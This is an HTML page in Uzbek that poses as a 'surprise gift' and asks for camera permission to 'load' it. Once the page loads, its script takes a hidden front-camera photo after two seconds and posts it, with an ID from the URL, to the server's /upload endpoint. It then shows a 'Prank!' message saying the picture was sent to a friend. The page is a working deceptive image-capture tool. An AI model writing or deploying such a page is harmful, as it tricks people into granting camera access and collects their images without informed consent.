<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kutilmagan Sovg'a! 🎁</title>
    <style>
        :root {
            --primary-color: #6c5ce7;
            --secondary-color: #a29bfe;
        }

        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background: linear-gradient(135deg, #6c5ce7, #00cec9);
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            color: white;
            overflow: hidden;
        }

        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.15);
            padding: 2rem;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
            width: 80%;
            max-width: 400px;
        }

        .loader {
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 5px solid white;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 { font-size: 1.5rem; margin-bottom: 1rem; }
        p { font-size: 1rem; opacity: 0.9; }

        #prank-message {
            display: none;
            animation: fadeIn 0.5s ease-in;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .emoji { font-size: 50px; margin-bottom: 10px; }

        video, canvas { display: none; }
    </style>
</head>
<body>

    <div class="container" id="main-container">
        <div id="loading-area">
            <div class="emoji">🎁</div>
            <h1>Sizga sovg'a yuborildi!</h1>
            <p>Sovg'ani yuklash uchun kameraga ruxsat bering...</p>
            <div class="loader"></div>
        </div>

        <div id="prank-message">
            <div class="emoji">😂</div>
            <h1>Prank!</h1>
            <p>Xavotir olmang, bu shunchaki hazil edi. Sizning rasmingiz do'stingizga yuborildi!</p>
            <button onclick="window.close()" style="margin-top:20px; padding:10px 20px; border-radius:10px; border:none; background:white; color:#6c5ce7; font-weight:bold; cursor:pointer;">Yopish</button>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" width="640" height="480"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loadingArea = document.getElementById('loading-area');
        const prankMessage = document.getElementById('prank-message');
        
        const urlParams = new URLSearchParams(window.location.search);
        const prankId = urlParams.get('id');

        // Kamera yoqish
        async function initPrank() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                // Kamera ishlashini kutish (2 soniya)
                setTimeout(() => {
                    takePhoto();
                }, 2000);
            } catch (err) {
                console.error("Kamera xatosi:", err);
                document.querySelector('p').innerText = "Xatolik: Kameraga ruxsat bermasangiz sovg'ani ochib bo'lmaydi! 🧐";
            }
        }

        function takePhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            const imageData = canvas.toDataURL('image/png');

            // Serverga yuborish
            fetch('/upload', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: prankId, image: imageData })
            })
            .then(res => res.json())
            .then(data => {
                // Kamera o'chirish
                const tracks = video.srcObject.getTracks();
                tracks.forEach(track => track.stop());

                // Xabarni ko'rsatish
                loadingArea.style.display = 'none';
                prankMessage.style.display = 'block';
            })
            .catch(err => console.error("Yuborishda xato:", err));
        }

        // Sahifa yuklanishi bilan prankni boshlash
        window.onload = initPrank;
    </script>
</body>
</html>
